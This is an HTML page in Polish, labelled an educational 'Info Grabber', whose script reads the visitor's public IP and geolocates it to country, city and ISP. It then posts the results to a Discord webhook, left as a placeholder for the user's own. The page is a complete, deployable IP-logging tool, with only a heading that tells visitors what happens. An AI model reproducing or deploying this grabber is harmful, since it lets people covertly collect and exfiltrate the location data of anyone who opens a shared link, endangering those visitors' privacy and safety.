<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Info Grabber (Edukacyjny)</title>
</head>
<body>
    <h1>Twój adres IP zostanie pokazany i wysłany na webhook (demo edukacyjne)</h1>
    <p id="ip">Ładowanie IP...</p>

    <script>
        const webhook = "https://discord.com/api/webhooks/TUTAJ_TWÓJ_WEBHOOK";

        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                document.getElementById("ip").innerText = `Twoje IP: ${ip}`;

                fetch(`http://ip-api.com/json/${ip}`)
                    .then(res => res.json())
                    .then(location => {
                        const embed = {
                            "content": "",
                            "embeds": [{
                                "title": `Nowe wejście na stronę`,
                                "description": `\`\`\`IP: ${ip}\nKraj: ${location.country}\nMiasto: ${location.city}\nISP: ${location.isp}\`\`\``,
                                "color": 3447003
                            }]
                        };

                        fetch(webhook, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(embed)
                        });
                    });
            });
    </script>
</body>
</html>
